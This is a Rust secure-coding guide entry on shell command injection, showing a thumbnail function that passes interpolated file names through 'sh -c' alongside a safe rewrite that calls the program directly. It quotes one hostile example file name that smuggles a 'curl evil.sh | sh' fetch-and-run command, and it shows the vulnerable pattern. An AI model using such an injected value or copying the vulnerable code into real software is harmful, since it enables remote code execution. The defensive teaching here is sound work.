---
aliases: []
language: rust
rust: ">=1.0"
severity: bug
category: security
topic: io
tags: [injection, subprocess, shell]
keywords: ['Command::new("sh")', '.arg("-c")', 'Command::new("bash")', 'Command::new("cmd")', '.args(["/C"', "format!("]
signature: "A shell command is built by formatting values into a string and run through sh -c, so any value containing shell syntax is executed."
distinguish: "Fine when the program is invoked directly with each value passed as its own arg, or when the shell string is a constant with no interpolated input."
added: 2026-09-23
source: jeremy-wayland
---

# Shell command built with format

## Smell

```rust
pub fn make_thumbnail(input: &str, output: &str) -> std::io::Result<ExitStatus> {
    Command::new("sh")
        .arg("-c")
        .arg(format!("convert {input} -resize 200x200 {output}"))
        .status()
}
```

## Why it's bad

- An uploaded file named `a.png; curl evil.sh | sh` runs the second command with the service's privileges.
  `Command` exists to avoid the shell, and `sh -c` reintroduces it.
- File names with spaces or quotes break the command even without an attacker, which is how this usually
  surfaces first.
- Quoting the values by hand looks like a fix and is not; escaping rules differ between shells and are easy to
  get subtly wrong.

## Better

```rust
pub fn make_thumbnail(input: &Path, output: &Path) -> std::io::Result<ExitStatus> {
    Command::new("convert")
        .arg(input)
        .args(["-resize", "200x200"])
        .arg(output)
        .status()
}
```
